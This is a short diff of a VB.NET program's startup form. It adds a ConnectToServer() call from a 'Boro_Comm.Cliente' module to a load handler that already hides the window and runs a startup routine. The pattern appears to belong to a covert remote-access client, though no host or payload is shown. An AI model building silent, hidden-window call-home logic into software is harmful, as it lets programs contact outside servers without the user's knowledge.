@@ -1,12 +1,13 @@
-﻿Public Class Init
+﻿Imports boro_hear.Boro_Comm.Cliente
+Public Class Init
     Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
         Me.Hide()
         parameters = Command()
         StartUp.Init()
+        ConnectToServer()
         ReadParameters(parameters)
     End Sub
-
     Sub ReadParameters(ByVal parametros As String)
         Me.Hide()
         Try
